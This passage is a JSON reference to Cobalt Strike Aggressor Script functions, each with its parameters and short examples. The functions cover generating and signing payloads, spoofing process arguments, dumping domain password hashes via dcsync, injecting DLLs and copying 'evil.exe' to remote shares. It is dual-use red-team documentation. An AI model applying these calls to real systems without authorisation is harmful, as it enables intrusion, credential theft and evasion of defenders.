{
  "-hasbootstraphint": {
    "description": "This function checks the stage.smartinject malleable c2 profile setting for the active team server. If the setting is set to false, the function will return false. If the setting is set to true, then the payload will be checked for the x86 or x64 bootstrap hints and will return true if the hint is found. Use this function to determine if it is safe to use an artifact that passes GetProcAddress/GetModuleHandlA pointers to this payload.",
    "arguments": [
      {
        "param": "$1",
        "desc": "byte array with a payload or shellcode."
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "-hasbootstraphint",
    "anchors": [
      "-hasbootstraphint"
    ]
  },
  "-is64": {
    "description": "Check if a session is on an x64 system or not (Beacon only).",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon/Session ID"
      }
    ],
    "returns": "",
    "example": "command x64 {\nforeach $session (beacons()) {\nif (-is64 $session['id']) {\nprintln($session);\n}\n}\n}",
    "notes": "",
    "signature": "-is64",
    "anchors": [
      "-is64"
    ]
  },
  "-isactive": {
    "description": "Check if a session is active or not. A session is considered active if (a) it has not acknowledged an exit message AND (b) it is not disconnected from a parent Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon/Session ID"
      }
    ],
    "returns": "",
    "example": "command active {\nlocal('$bid');\nforeach $bid (beacon_ids()) {\nif (-isactive $bid) {\nprintln(\"$bid is active!\");\n}\n}\n}",
    "notes": "",
    "signature": "-isactive",
    "anchors": [
      "-isactive"
    ]
  },
  "-isadmin": {
    "description": "Check if a session has admin rights",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon/Session ID"
      }
    ],
    "returns": "",
    "example": "command admin_sessions {\nforeach $session (beacons()) {\nif (-isadmin $session['id']) {\nprintln($session);\n}\n}\n}",
    "notes": "",
    "signature": "-isadmin",
    "anchors": [
      "-isadmin"
    ]
  },
  "-isbeacon": {
    "description": "Check if a session is a Beacon or not.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon/Session ID"
      }
    ],
    "returns": "",
    "example": "command beacons {\nforeach $session (beacons()) {\nif (-isbeacon $session['id']) {\nprintln($session);\n}\n}\n}",
    "notes": "",
    "signature": "-isbeacon",
    "anchors": [
      "-isbeacon"
    ]
  },
  "-isssh": {
    "description": "Check if a session is an SSH session or not.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon/Session ID"
      }
    ],
    "returns": "",
    "example": "command ssh_sessions {\nforeach $session (beacons()) {\nif (-isssh $session['id']) {\nprintln($session);\n}\n}\n}",
    "notes": "",
    "signature": "-isssh",
    "anchors": [
      "-isssh"
    ]
  },
  "action": {
    "description": "Post a public action message to the event log. This is similar to the /me command.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the message"
      }
    ],
    "returns": "",
    "example": "action(\"dances!\");",
    "notes": "",
    "signature": "action",
    "anchors": [
      "action"
    ]
  },
  "addTab": {
    "description": "Create a tab to display a GUI object.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the title of the tab"
      },
      {
        "param": "$2",
        "desc": "a GUI object. A GUI object is one that is an instance of javax.swing.JComponent."
      },
      {
        "param": "$3",
        "desc": "a tooltip to display when a user hovers over this tab."
      }
    ],
    "returns": "",
    "example": "$label = [new javax.swing.JLabel: \"Hello World\"];\naddTab(\"Hello!\", $label, \"this is an example\");",
    "notes": "",
    "signature": "addTab",
    "anchors": [
      "addTab"
    ]
  },
  "addVisualization": {
    "description": "Register a visualization with Cobalt Strike.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the name of the visualization"
      },
      {
        "param": "$2",
        "desc": "a javax.swing.JComponent object"
      }
    ],
    "returns": "",
    "example": "$label = [new javax.swing.JLabel: \"Hello World!\"];\naddVisualization(\"Hello World\", $label);\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "addVisualization",
    "anchors": [
      "addVisualization"
    ]
  },
  "add_to_clipboard": {
    "description": "Add text to the clipboard, notify the user.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the text to add to the clipboard"
      }
    ],
    "returns": "",
    "example": "add_to_clipboard(\"Paste me you fool!\");",
    "notes": "",
    "signature": "add_to_clipboard",
    "anchors": [
      "add_to_clipboard"
    ]
  },
  "alias": {
    "description": "Creates an alias command in the Beacon console",
    "arguments": [
      {
        "param": "$1",
        "desc": "the alias name to bind to"
      },
      {
        "param": "$2",
        "desc": "a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments."
      }
    ],
    "returns": "",
    "example": "alias(\"foo\", {\nbtask($1, \"foo!\");\n});\n\nSee Also\n\nUser Defined Tab Completion",
    "notes": "",
    "signature": "alias",
    "anchors": [
      "alias"
    ]
  },
  "alias_clear": {
    "description": "Removes an alias command (and restores default functionality; if it existed)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the alias name to remove"
      }
    ],
    "returns": "",
    "example": "alias_clear(\"foo\");",
    "notes": "",
    "signature": "alias_clear",
    "anchors": [
      "alias_clear"
    ]
  },
  "all_payloads": {
    "description": "Generates all the stageless payloads (in x86 and x64) for all the configured listeners. Use the listeners_stageless aggressor function to see the list that will be used for the active team server.",
    "arguments": [
      {
        "param": "$1",
        "desc": "The folder path to create the payloads in. This folder path must already exist."
      },
      {
        "param": "$2",
        "desc": "A boolean value for whether the executable files should be signed."
      },
      {
        "param": "$3",
        "desc": "A string value for the system call method. Valid values are:"
      },
      {
        "param": "$4",
        "desc": "(optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string)."
      },
      {
        "param": "$5",
        "desc": "(optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string)."
      }
    ],
    "returns": "",
    "example": "$folder = all_payloads(\"/tmp/payloads\", 1, \"None\");println(\"Payloads have been saved to $folder\");",
    "notes": "",
    "signature": "all_payloads",
    "anchors": [
      "all_payloads"
    ]
  },
  "applications": {
    "description": "Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each application.",
    "example": "printAll(applications());",
    "notes": "",
    "signature": "applications",
    "anchors": [
      "applications"
    ]
  },
  "archives": {
    "description": "Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about your team's activity.",
    "example": "foreach $index => $entry (archives()) {\nprintln(\"\\c3( $+ $index $+ )\\o $entry\");\n}",
    "notes": "",
    "signature": "archives",
    "anchors": [
      "archives"
    ]
  },
  "artifact": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager instead.\n\nGenerates a stager artifact (exe, dll) from a Cobalt Strike listener",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "the artifact type"
      },
      {
        "param": "$3",
        "desc": "deprecated; this parameter no longer has any meaning."
      },
      {
        "param": "$4",
        "desc": "x86|x64 - the architecture of the generated stager"
      }
    ],
    "returns": "A scalar containing the specified artifact.",
    "example": "$data = artifact(\"my-listener\", \"exe\");\n\n$handle = openf(\">out.exe\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.",
    "signature": "artifact",
    "anchors": [
      "artifact"
    ]
  },
  "artifact_general": {
    "description": "Generates a payload artifact from arbitrary shellcode.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the shellcode"
      },
      {
        "param": "$2",
        "desc": "the artifact type"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the generated payload"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3",
    "signature": "artifact_general",
    "anchors": [
      "artifact_general"
    ]
  },
  "artifact_payload": {
    "description": "Generates a stageless payload artifact (exe, dll) from a Cobalt Strike listener name",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "the artifact type"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the generated payload (stage)"
      },
      {
        "param": "$4",
        "desc": "exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process."
      },
      {
        "param": "$5",
        "desc": "A string value for the system call method. Valid values are:"
      },
      {
        "param": "$6",
        "desc": "(optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string)."
      },
      {
        "param": "$7",
        "desc": "(optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string)."
      }
    ],
    "returns": "",
    "example": "$data = artifact_payload(\"my-listener\", \"exe\", \"x86\", “process”, “Indirect”);",
    "notes": "While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3",
    "signature": "artifact_payload",
    "anchors": [
      "artifact_payload"
    ]
  },
  "artifact_sign": {
    "description": "Sign an EXE or DLL file using the code-signer malleable c2 profile setting for the active team server.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the contents of the EXE or DLL file to sign"
      }
    ],
    "returns": "A scalar containing the signed artifact.",
    "example": "# generate an artifact!\n$data = artifact_payload(\"my-listener\", \"exe\", \"x64\", \"process\", \"Indirect\");\n\n# sign it.\n$data = artifact_sign($data);\n\n# save it\n$handle = openf(\">out.exe\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "- This function requires that a code-signing certificate is specified in this server's Malleable C2 profile. If no code-signing certificate is configured, this function will return $1 with no changes.\n\n- \n\nIf the Cobalt Strike UI is connected to multiple team servers, the code-signer used is for the active team server which may not be the team server used to generate the artifact.\n\n- DO NOT sign an executable or DLL twice. The library Cobalt Strike uses for code-signing will create an invalid (second) signature if the executable or DLL is already signed.",
    "signature": "artifact_sign",
    "anchors": [
      "artifact_sign"
    ]
  },
  "artifact_stageless": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_payload instead.\n\nGenerates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name (must be local to this team server)"
      },
      {
        "param": "$2",
        "desc": "the artifact type"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the generated payload (stage)"
      },
      {
        "param": "$4",
        "desc": "proxy configuration string"
      },
      {
        "param": "$5",
        "desc": "callback function. This function is called when the artifact is ready. The $1 argument is the stageless content."
      }
    ],
    "returns": "",
    "example": "sub ready {\nlocal('$handle');\n$handle = openf(\">out.exe\");\nwriteb($handle, $1);\nclosef($handle);\n}\n\nartifact_stageless(\"my-listener\", \"exe\", \"x86\", \"\", &ready);",
    "notes": "- This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.\n\n- The proxy configuration string is the same string you would use with Payloads -> Windows Stageless Payload. *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:[email protected]:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or \"\" to use the default behavior. Custom dialogs may use &drow_proxyserver to set this.\n\n- This function cannot generate artifacts for listeners on other team servers. This function also cannot generate artifacts for foreign listeners. Limit your use of this function to local listers with stages only. Custom dialogs may use &drow_listener_stage to choose an acceptable listener for this function.\n\n- Note: while the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3",
    "signature": "artifact_stageless",
    "anchors": [
      "artifact_stageless"
    ]
  },
  "artifact_stager": {
    "description": "Generates a stager artifact (exe, dll) from a Cobalt Strike listener",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "the artifact type"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the generated stager"
      }
    ],
    "returns": "A scalar containing the specified artifact.",
    "example": "$data = artifact_stager(\"my-listener\", \"exe\", \"x86\");\n\n$handle = openf(\">out.exe\");\nwriteb($handle, $data);\nclosef($handle);",
    "notes": "Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.",
    "signature": "artifact_stager",
    "anchors": [
      "artifact_stager"
    ]
  },
  "barch": {
    "description": "Returns the architecture of your Beacon session (e.g., x86 or x64)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to pull metadata for"
      }
    ],
    "returns": "",
    "example": "println(\"Arch is: \" . barch($1));",
    "notes": "If the architecture is unknown (e.g., a DNS Beacon that hasn't sent metadata yet); this function will return x86.",
    "signature": "barch",
    "anchors": [
      "barch"
    ]
  },
  "bargue_add": {
    "description": "This function adds an option to Beacon's list of commands to spoof arguments for.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command to spoof arguments for. Environment variables are OK here too."
      },
      {
        "param": "$3",
        "desc": "the fake arguments to use when the specified command is run."
      }
    ],
    "returns": "",
    "example": "# spoof cmd.exe arguments.\nbargue_add($1, \"%COMSPEC%\", \"/K \\\"cd c:\\windows\\temp & startupdatenow.bat\\\"\");\n\n# spoof net arguments\nbargue_add($1, \"net\", \"user guest /active:no\");",
    "notes": "- The process match is exact. If Beacon tries to launch \"net.exe\", it will not match net, NET.EXE, or c:\\windows\\system32\\net.exe. It will only match net.exe.\n\n- x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.\n\n- The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.",
    "signature": "bargue_add",
    "anchors": [
      "bargue_add"
    ]
  },
  "bargue_list": {
    "description": "List the commands + fake arguments Beacon will spoof arguments for.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bargue_list($1);",
    "notes": "",
    "signature": "bargue_list",
    "anchors": [
      "bargue_list"
    ]
  },
  "bargue_remove": {
    "description": "This function removes an option to Beacon's list of commands to spoof arguments for.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the command to spoof arguments for. Environment variables are OK here too."
      }
    ],
    "returns": "",
    "example": "# don't spoof cmd.exe\nbargue_remove($1, \"%COMSPEC%\");",
    "notes": "",
    "signature": "bargue_remove",
    "anchors": [
      "bargue_remove"
    ]
  },
  "base64_decode": {
    "description": "Unwrap a base64-encoded string",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to decode"
      }
    ],
    "returns": "The argument processed by a base64 decoder",
    "example": "println(base64_decode(base64_encode(\"this is a test\")));",
    "notes": "",
    "signature": "base64_decode",
    "anchors": [
      "base64_decode"
    ]
  },
  "base64_encode": {
    "description": "Base64 encode a string",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to encode"
      }
    ],
    "returns": "The argument processed by a base64 encoder",
    "example": "println(base64_encode(\"this is a test\"));",
    "notes": "",
    "signature": "base64_encode",
    "anchors": [
      "base64_encode"
    ]
  },
  "bbeacon_config": {
    "description": "Use this script function with the host command to view and update beacon status and configuration . Use the failover_notification command to control beacon failover notifications\n\nFailover_Notification Command\n\nUse this command to retrieve the current notification setting from a beacon [HTTP|DNS]. Use the [true|false] arguments to enable/disable notifications from a beacon [HTTP|DNS] when host rotation occurs from failover events.\n\nbbeacon_config failover_notification [true | false]",
    "arguments": [],
    "returns": "",
    "example": "$beacon_id = $1;\nbbeacon_config($beacon_id, \"failover_notification\");\nbbeacon_config($beacon_id, \"failover_notification\", \"true\");\nbbeacon_config($beacon_id, \"failover_notification\", \"false\");\n\nHost Command\n\nUse this command to view and update beacon status and configuration of the beacons callback host list.\n\nbbeacon_config [host] [action] [arguments]\n\nwhere Action and Arguments can be:\n\nAction\nDescription",
    "notes": "",
    "arguments_raw": "add\nAdd a host/uri to the beacons callback host list. The uri must be known by the server. A maximum of 32 hosts may be defined. Multiple hosts and uris can be used by way of a comma-separated list.\n[hostname] [uri]\n\ninfo\nRetrieve host callback information from a beacon.\n\nhold\nHold a host in the callback host list [Random and Round-Robin rotation only]. Multiple hosts can be used by way of a comma-separated list.\n[hostname]\n\nprofiles\nList the host profiles available in the beacon config.\n\nrelease\nRelease a host in the callback host list [Random and Round-Robin rotation only]. Multiple hosts can be used by way of a comma-separated list.\n[hostname]\n\nremove\nRemove a host from the beacons callback host list. Multiple hosts can be used by way of a comma-separated list.\n[hostname]\n\nreset\nReset the status and/or statistics for callback hosts.\n[all|status|statistics] [hostname]\n\nupdate\nChange the host/uri of an existing host/uri in the host list. The uri must be known by the server. Multiple hosts and uris can be used by way of a comma-separated list.\n[original-hostname] [new-hostname] [new-uri]\n\nExamples\n\nAdd a host to host list\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"add\", [hostname], [uri]);\nbbeacon_config($beacon_id, \"host\", \"add\", [hostname1,hostname2], [uri1,uri2]);\n\nRemove a host\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"remove\", [hostname]);\nbbeacon_config($beacon_id, \"host\", \"remove\", [hostname1,hostname2]);\n\nChange a host name\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"update\", [original-hostname], [new-hostname]);\nbbeacon_config($beacon_id, \"host\", \"update\", [original-hostname1,original-hostname2], [new-hostname1,new-hostname2]);\nbbeacon_config($beacon_id, \"host\", \"update\", [original-hostname], [new-hostname], [new-uri]);\nbbeacon_config($beacon_id, \"host\", \"update\", [original-hostname1,original-hostname2], [new-hostname1,new-hostname2], [new-uri1,new-uri2]);\n\nList defined host profile host names\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"profiles\");\n\nRetrieve host callback information\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"info\");\n\nReset status/statistics\n\n$beacon_id = $1;\nbbeacon_config($beacon_id, \"host\", \"reset\", \"[all|status|statistics]\");\nbbeacon_config($beacon_id, \"host\", \"reset\", \"[all|status|statistics]\", [hostname]);\nbbeacon_config($beacon_id, \"host\", \"reset\", \"[all|status|statistics]\", [hostname1,hostname2]);\n\nNOTE: \n\nResetting status will reset:\n\n- Host held setting\n\nResetting statistics will reset:\n\n- Last successful connection timestamp\n\n- Last failed connection timestamp\n\n- Successful connection count\n\n- Failed connection count",
    "signature": "bbeacon_config",
    "anchors": [
      "bbeacon_config"
    ]
  },
  "bbeacon_gate": {
    "description": "Change the use of beacon gate at runtime to disable/enable the functionality. See Malleable PE, Process Injection, and Post Exploitation > Beacon Gate for more information.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "enable or disable to change the beacon gate behavior."
      }
    ],
    "returns": "",
    "example": "# Disable the beacon gate functionality\nbbeacon_gate($1, \"disable\");",
    "notes": "",
    "signature": "bbeacon_gate",
    "anchors": [
      "bbeacon_gate"
    ]
  },
  "bblockdlls": {
    "description": "Launch child processes with binary signature policy that blocks non-Microsoft DLLs from loading in the process space.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "true or false; block non-Microsoft DLLs in child process"
      }
    ],
    "returns": "",
    "example": "on beacon_initial {\nbinput($1, \"blockdlls start\");\nbblockdlls($1, true);\n}",
    "notes": "This attribute is available in Windows 10 only.",
    "signature": "bblockdlls",
    "anchors": [
      "bblockdlls"
    ]
  },
  "bbrowser": {
    "description": "Generate the beacon browser GUI component. Shows only Beacons.",
    "arguments": [],
    "returns": "The beacon browser GUI object (a javax.swing.JComponent)",
    "example": "addVisualization(\"Beacon Browser\", bbrowser());\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "bbrowser",
    "anchors": [
      "bbrowser"
    ]
  },
  "bbrowserpivot": {
    "description": "Start a Browser Pivot",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to inject the browser pivot agent into."
      },
      {
        "param": "$3",
        "desc": "the architecture of the target PID (x86|x64)"
      }
    ],
    "returns": "",
    "example": "bbrowserpivot($1, 1234, \"x86\");",
    "notes": "",
    "signature": "bbrowserpivot",
    "anchors": [
      "bbrowserpivot"
    ]
  },
  "bbrowserpivot_stop": {
    "description": "Stop a Browser Pivot",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bbrowserpivot_stop($1);",
    "notes": "",
    "signature": "bbrowserpivot_stop",
    "anchors": [
      "bbrowserpivot_stop"
    ]
  },
  "bbypassuac": {
    "description": "REMOVED Removed in Cobalt Strike 4.0.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "bbypassuac",
    "anchors": [
      "bbypassuac"
    ]
  },
  "bcancel": {
    "description": "Cancel a file download",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file to cancel or a wildcard."
      }
    ],
    "returns": "",
    "example": "item \"&Cancel Downloads\" {\nbcancel($1, \"*\");\n}",
    "notes": "",
    "signature": "bcancel",
    "anchors": [
      "bcancel"
    ]
  },
  "bcd": {
    "description": "Ask a Beacon to change it's current working directory.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the folder to change to."
      }
    ],
    "returns": "",
    "example": "# create a command to change to the user's home directory\nalias home {\n$home = \"c:\\\\users\\\\\" . binfo($1, \"user\");\nbcd($1, $home);\n}",
    "notes": "",
    "signature": "bcd",
    "anchors": [
      "bcd"
    ]
  },
  "bcheckin": {
    "description": "Ask a Beacon to checkin. This is basically a no-op for Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"&Checkin\" {\nbinput($1, \"checkin\");\nbcheckin($1);\n}",
    "notes": "",
    "signature": "bcheckin",
    "anchors": [
      "bcheckin"
    ]
  },
  "bclear": {
    "description": "This is the \"oops\" command. It clears the queued tasks for the specified beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bclear($1);",
    "notes": "",
    "signature": "bclear",
    "anchors": [
      "bclear"
    ]
  },
  "bclipboard": {
    "description": "Ask beacon to get the text clipboard contents.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bclipboard($1);",
    "notes": "",
    "signature": "bclipboard",
    "anchors": [
      "bclipboard"
    ]
  },
  "bconnect": {
    "description": "Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target to connect to"
      },
      {
        "param": "$3",
        "desc": "(optional) the port to use. Default profile port is used otherwise."
      }
    ],
    "returns": "",
    "example": "bconnect($1, \"DC\");",
    "notes": "Use &beacon_link if you want a script function that will connect or link based on a listener configuration.",
    "signature": "bconnect",
    "anchors": [
      "bconnect"
    ]
  },
  "bcovertvpn": {
    "description": "Ask Beacon to deploy a Covert VPN client.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the Covert VPN interface to deploy"
      },
      {
        "param": "$3",
        "desc": "the IP address of the interface [on target] to bridge into"
      },
      {
        "param": "$4",
        "desc": "(optional) the MAC address of the Covert VPN interface"
      }
    ],
    "returns": "",
    "example": "bcovertvpn($1, \"phear0\", \"172.16.48.18\");",
    "notes": "",
    "signature": "bcovertvpn",
    "anchors": [
      "bcovertvpn"
    ]
  },
  "bcp": {
    "description": "Ask Beacon to copy a file or folder.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the file or folder to copy"
      },
      {
        "param": "$3",
        "desc": "the destination"
      }
    ],
    "returns": "",
    "example": "bcp($1, \"evil.exe\", \"\\\\\\\\target\\\\C$\\\\evil.exe\");",
    "notes": "",
    "signature": "bcp",
    "anchors": [
      "bcp"
    ]
  },
  "bdata": {
    "description": "Get metadata for a Beacon session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon to pull metadata for"
      }
    ],
    "returns": "A dictionary object with metadata about the Beacon session.",
    "example": "println(bdata(\"1234\"));",
    "notes": "",
    "signature": "bdata",
    "anchors": [
      "bdata"
    ]
  },
  "bdata_store_list": {
    "description": "List the post-ex items currently available in the data store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "bdata_store_list($1);",
    "notes": "",
    "signature": "bdata_store_list",
    "anchors": [
      "bdata_store_list"
    ]
  },
  "bdata_data_store_load": {
    "description": "Load post-ex items to Beacon. This provides a mechanism to upload data and then query it via BOFs using APIs such as BeaconStoreGetItem().",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "item type [bof|dotnet|file]"
      },
      {
        "param": "$3",
        "desc": "file path"
      },
      {
        "param": "$4",
        "desc": "(optional) item name (If omitted, the file name is used)."
      }
    ],
    "returns": "",
    "example": "alias \"data_store_load\" {\nblog($1, \"Loading data store...\");\nbdata_store_load($1, \"bof\", \"/home/someone/file.bof\");\nbdata_store_load($1, \"dotnet\", \"/home/someone/file.dotnet\");\nbdata_store_load($1, \"file\", \"/home/someone/file.data\");\nblog($1, \"Loaded data store...\");\n}\n\nalias \"data_store_load_with_name\" {\nblog($1, \"Loading data store with names...\");\nbdata_store_load($1, \"bof\", \"/home/someone/file.bof\", \"myBof\");\nbdata_store_load($1, \"dotnet\", \"/home/someone/file.dotnet\", \"myDotNet\");\nbdata_store_load($1, \"file\", \"/home/someone/file.data\", \"myData\");\nblog($1, \"Loaded data store with names...\");\n}",
    "notes": "",
    "signature": "bdata_store_load",
    "anchors": [
      "bdata_data_store_load"
    ]
  },
  "bdata_data_store_unload": {
    "description": "Remove specific post-ex item from the store.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "index"
      }
    ],
    "returns": "",
    "example": "bdata_store_unload($1, parseNumber($2));",
    "notes": "",
    "signature": "bdata_store_unload",
    "anchors": [
      "bdata_data_store_unload"
    ]
  },
  "bdcsync": {
    "description": "Use mimikatz's dcsync command to pull a user's password hash from a domain controller. This function requires a domain administrator trust relationship.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "fully qualified name of the domain"
      },
      {
        "param": "$3",
        "desc": "(optional) DOMAIN\\user to pull hashes for"
      },
      {
        "param": "$4",
        "desc": "(optional) the PID to inject the dcsync command into or $null"
      },
      {
        "param": "$5",
        "desc": "(optional) the architecture of the target PID (x86|x64) or $null"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "If $3 is left out, dcsync will dump all domain hashes.\n\nExamples\nSpawn a temporary process\n# dump a specific account\nbdcsync($1, \"PLAYLAND.testlab\", \"PLAYLAND\\\\Administrator\");\n\n# dump all accounts\nbdcsync($1, \"PLAYLAND.testlab\");\n\nInject into the specified process\n# dump a specific account\nbdcsync($1, \"PLAYLAND.testlab\", \"PLAYLAND\\\\Administrator\", 1234, \"x64\");\n\n# dump all accounts\nbdcsync($1, \"PLAYLAND.testlab\", $null, 1234, \"x64\");",
    "signature": "bdcsync",
    "anchors": [
      "bdcsync"
    ]
  },
  "bdesktop": {
    "description": "Start a VNC session.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      }
    ],
    "returns": "",
    "example": "item \"&Desktop (VNC)\" {\nbdesktop($1); \n}",
    "notes": "",
    "signature": "bdesktop",
    "anchors": [
      "bdesktop"
    ]
  },
  "bdllinject": {
    "description": "Inject a Reflective DLL into a process.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the PID to inject the DLL into"
      },
      {
        "param": "$3",
        "desc": "the local path to the Reflective DLL"
      }
    ],
    "returns": "",
    "example": "bdllinject($1, 1234, script_resource(\"test.dll\"));",
    "notes": "",
    "signature": "bdllinject",
    "anchors": [
      "bdllinject"
    ]
  },
  "bdllload": {
    "description": "Call LoadLibrary() in a remote process with the specified DLL.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the target process PID"
      },
      {
        "param": "$3",
        "desc": "the on-target path to a DLL"
      }
    ],
    "returns": "",
    "example": "bdllload($1, 1234, \"c:\\\\windows\\\\mystuff.dll\");",
    "notes": "The DLL must be the same architecture as the target process.",
    "signature": "bdllload",
    "anchors": [
      "bdllload"
    ]
  },
  "bdllspawn": {
    "description": "Spawn a Reflective DLL as a Beacon post-exploitation job.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the id for the beacon. This may be an array or a single ID."
      },
      {
        "param": "$2",
        "desc": "the local path to the Reflective DLL"
      },
      {
        "param": "$3",
        "desc": "a parameter to pass to the DLL"
      },
      {
        "param": "$4",
        "desc": "a short description of this post exploitation job (shows up in jobs output)"
      },
      {
        "param": "$5",
        "desc": "wait time for returned data specified in milliseconds (5000 = 5 seconds)"
      },
      {
        "param": "$6",
        "desc": "true/false; use impersonated token when running this post-ex job?"
      },
      {
        "param": "$7",
